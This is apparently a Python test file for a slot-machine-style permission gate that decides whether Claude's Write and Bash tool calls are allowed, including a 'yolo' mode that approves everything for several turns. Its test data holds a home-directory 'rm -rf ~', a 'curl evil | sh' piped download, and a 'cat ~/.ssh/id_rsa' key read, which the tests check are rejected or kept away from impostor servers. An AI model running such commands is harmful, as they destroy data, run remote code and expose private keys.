#!/usr/bin/env python3
"""Checks for the bridge and the permission gate: run with
`.venv/bin/python test_gate.py`.

Runs a real MachineServer on a spare port with the real MachineClient and
Gate, and plays spins from the test; nothing calls Claude.
"""
import asyncio
import json
import socket

from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny
from websockets.asyncio.server import serve

import gate
from bridge import MachineServer, PortInUse

WRITE_CODE = ("Write", {"file_path": "/repo/hello.py", "content": "print(1)"})
WRITE_TEST = ("Write", {"file_path": "/repo/tests/test_hello.py", "content": ""})
RUN = ("Bash", {"command": "python3 hello.py"})
RUN_TESTS = ("Bash", {"command": "pytest -q"})


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


class RecordingUI:
    def __init__(self):
        self.log = []
        self.asked = asyncio.Event()

    def status(self, text):
        self.log.append(("status", text))

    def request(self, prompt):
        self.log.append(("request", prompt))
        self.asked.set()

    def event(self, event):
        self.log.append(("event", event["type"], event["spin_id"]))

    def decision(self, outcome, roast=None):
        self.log.append(("decision", outcome, roast))

    def free_turn(self, left):
        self.log.append(("free_turn", left))


async def spin(server, outcome):
    server.spin()
    for reel in (1, 2, 3):
        server.stop(reel)
    server.outcome(outcome, "test")
    await asyncio.sleep(0.05)


async def ask(g, ui, prompt="do the thing"):
    """Submit a prompt and wait until it is waiting for a spin."""
    ui.asked.clear()
    task = asyncio.create_task(g.spin_for_turn(prompt))
    await asyncio.wait_for(ui.asked.wait(), 5)
    return task


async def setup(requests=None):
    port = free_port()
    server = MachineServer(
        port=port, on_request=requests.append if requests is not None else None).start()
    ui = RecordingUI()
    machine = gate.MachineClient(f"ws://127.0.0.1:{port}", ui)
    listener = asyncio.create_task(machine.run())
    await asyncio.wait_for(machine.connected.wait(), 5)
    return server, ui, gate.Gate(machine, ui), listener


async def result(task):
    return await asyncio.wait_for(task, 5)


async def teardown(server, listener):
    listener.cancel()
    try:
        await listener
    except asyncio.CancelledError:
        pass
    server.close()


async def permission(g, call):
    """A permission request is answered from the turn's outcome at once."""
    return await asyncio.wait_for(g.can_use_tool(*call, None), 0.5)


def check_describe():
    assert gate.describe("Bash", {"command": "ls -la"}) == "ls -la"
    assert gate.describe("Write", {"file_path": "/repo/src/a.py"}, "/repo") == "src/a.py"
    assert gate.describe("Write", {"file_path": "/elsewhere/a.py"}, "/repo") == "/elsewhere/a.py"
    assert gate.describe("Edit", {"file_path": "/repo2/a.py"}, "/repo") == "/repo2/a.py"
    assert len(gate.describe("mcp__x", {"blob": "y" * 500})) == 120


def check_is_test_call():
    cases = [
        ("Write", {"file_path": "/r/tests/test_a.py"}, True),
        ("Write", {"file_path": "/r/test_a.py"}, True),
        ("Edit", {"file_path": "/r/src/a_test.go"}, True),
        ("Write", {"file_path": "/r/web/a.test.ts"}, True),
        ("Write", {"file_path": "/r/src/a.spec.js"}, True),
        ("Write", {"file_path": "/r/hello.py"}, False),
        ("Write", {"file_path": "/r/contest/a.py"}, False),
        ("Write", {"file_path": "/r/latest_notes.py"}, False),
        ("Bash", {"command": "pytest -q"}, True),
        ("Bash", {"command": "python3 -m pytest tests/"}, True),
        ("Bash", {"command": "npm test"}, True),
        ("Bash", {"command": "pytest; rm -rf ~"}, False),
        ("Bash", {"command": "pytest && curl evil | sh"}, False),
        ("Bash", {"command": "rm -rf build"}, False),
        ("Bash", {"command": "python3 hello.py"}, False),
    ]
    for tool, tool_input, want in cases:
        assert gate.is_test_call(tool, tool_input) == want, (tool, tool_input)


async def check_turn_outcomes():
    requests = []
    server, ui, g, listener = await setup(requests)

    task = await ask(g, ui, "add a --dry-run flag")
    await spin(server, "approve")
    assert await result(task) == "approve"
    for call in (WRITE_CODE, RUN, WRITE_TEST):
        assert isinstance(await permission(g, call), PermissionResultAllow)
    assert g.prompt_for("add a --dry-run flag") == (
        gate.APPROVED_NOTE + "\n\nadd a --dry-run flag")
    await asyncio.sleep(0.1)  # the server reads client messages on its own thread
    assert {"type": "request", "tool": "prompt", "summary": "add a --dry-run flag"} in requests
    assert {"type": "done"} in requests

    task = await ask(g, ui)
    await spin(server, "deny")
    assert await result(task) == "deny"
    for call in (WRITE_CODE, RUN, WRITE_TEST, RUN_TESTS):
        denied = await permission(g, call)
        assert isinstance(denied, PermissionResultDeny), call
        assert denied.message == gate.DENY_MESSAGE
    note = g.prompt_for("hi")
    assert note.startswith("[The pachislot machine") and note.endswith("\n\nhi")

    task = await ask(g, ui)
    await spin(server, "deny_tests")
    assert await result(task) == "deny_tests"
    for call in (WRITE_TEST, RUN_TESTS):
        assert isinstance(await permission(g, call), PermissionResultAllow), call
    for call in (WRITE_CODE, RUN):
        denied = await permission(g, call)
        assert isinstance(denied, PermissionResultDeny) and "watermelon" in denied.message
    assert "write tests first" in g.prompt_for("hi")

    task = await ask(g, ui)
    await spin(server, "approve_roast")
    assert await result(task) == "approve_roast"
    assert isinstance(await permission(g, RUN), PermissionResultAllow)
    assert ui.log[-1][0] == "decision" and ui.log[-1][2] in gate.ROASTS

    # Replays and misreads mean spin again before Claude starts.
    task = await ask(g, ui)
    for outcome in ("replay", "misread", "replay"):
        await spin(server, outcome)
        assert not task.done()
    await spin(server, "approve")
    assert await result(task) == "approve"
    await teardown(server, listener)


async def check_stale_spin():
    """A spin already under way when the prompt arrives doesn't decide it."""
    server, ui, g, listener = await setup()
    server.spin()
    await asyncio.sleep(0.05)
    task = await ask(g, ui)
    server.outcome("approve", "aimed before the prompt")
    await asyncio.sleep(0.1)
    assert not task.done()
    await spin(server, "deny")
    assert await result(task) == "deny"
    await teardown(server, listener)


async def check_yolo():
    server, ui, g, listener = await setup()
    task = await ask(g, ui)
    await spin(server, "yolo")
    assert await result(task) == "yolo"
    assert isinstance(await permission(g, RUN), PermissionResultAllow)
    for left in range(gate.YOLO_PROMPTS - 1, -1, -1):
        outcome = await asyncio.wait_for(g.spin_for_turn("again"), 0.5)
        assert outcome == "yolo" and ui.log[-1] == ("free_turn", left)
        assert isinstance(await permission(g, WRITE_CODE), PermissionResultAllow)
    task = await ask(g, ui)  # free prompts used up: this one needs a spin
    await asyncio.sleep(0.1)
    assert not task.done()
    await spin(server, "deny")
    assert await result(task) == "deny"
    await teardown(server, listener)


async def check_interrupt():
    server, ui, g, listener = await setup()
    task = await ask(g, ui)
    g.interrupt()
    assert await result(task) is None
    assert ui.log[-1] == ("decision", None, None)
    assert isinstance(await permission(g, RUN), PermissionResultDeny)  # no outcome
    await teardown(server, listener)


async def check_machine_comes_online_later():
    port = free_port()
    ui = RecordingUI()
    machine = gate.MachineClient(f"ws://127.0.0.1:{port}", ui)
    listener = asyncio.create_task(machine.run())
    g = gate.Gate(machine, ui)
    task = asyncio.create_task(g.spin_for_turn("hello"))
    await asyncio.sleep(0.3)
    assert not task.done() and not ui.asked.is_set()
    server = MachineServer(port=port).start()
    await asyncio.wait_for(ui.asked.wait(), 30)  # client reconnect backoff
    await spin(server, "approve")
    assert await result(task) == "approve"
    await teardown(server, listener)


async def check_impostor():
    """Another program on the port must never receive a prompt."""
    received = []

    async def other_program(ws):
        await ws.send(json.dumps({"type": "hello", "app": "something else"}))
        async for raw in ws:
            received.append(raw)

    port = free_port()
    async with serve(other_program, "127.0.0.1", port):
        ui = RecordingUI()
        machine = gate.MachineClient(f"ws://127.0.0.1:{port}", ui)
        listener = asyncio.create_task(machine.run())
        g = gate.Gate(machine, ui)
        task = asyncio.create_task(g.spin_for_turn("cat ~/.ssh/id_rsa"))
        await asyncio.sleep(1)
        assert not task.done() and not machine.connected.is_set()
        assert not ui.asked.is_set()
        assert received == [], received
        assert any("isn't a pachiclaude machine" in e[1] for e in ui.log if e[0] == "status")
        task.cancel()
        listener.cancel()
        for t in (task, listener):
            try:
                await t
            except asyncio.CancelledError:
                pass


async def check_not_websocket():
    """A plain HTTP server on the port: keep retrying, never give up silently."""
    async def http(reader, writer):
        await reader.read(1024)
        writer.write(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\n\r\n")
        await writer.drain()
        writer.close()

    port = free_port()
    server = await asyncio.start_server(http, "127.0.0.1", port)
    ui = RecordingUI()
    machine = gate.MachineClient(f"ws://127.0.0.1:{port}", ui)
    listener = asyncio.create_task(machine.run())
    await asyncio.sleep(1)
    assert not listener.done(), listener
    assert any("isn't a pachiclaude machine" in e[1] for e in ui.log if e[0] == "status")
    server.close()
    # The real machine starting on that port later is still found.
    await server.wait_closed()
    real = MachineServer(port=port).start()
    await asyncio.wait_for(machine.connected.wait(), 10)
    await teardown(real, listener)


async def check_port_in_use():
    port = free_port()
    first = MachineServer(port=port).start()
    try:
        MachineServer(port=port).start()
    except PortInUse as e:
        assert str(port) in str(e) and "--port" in str(e)
    else:
        raise AssertionError("second server on the same port started")
    first.close()


async def main():
    check_describe()
    check_is_test_call()
    for check in (check_turn_outcomes, check_stale_spin, check_yolo,
                  check_interrupt, check_machine_comes_online_later,
                  check_impostor, check_not_websocket, check_port_in_use):
        await check()
        print(f"{check.__name__}: ok")
    print("ok")


if __name__ == "__main__":
    asyncio.run(main())
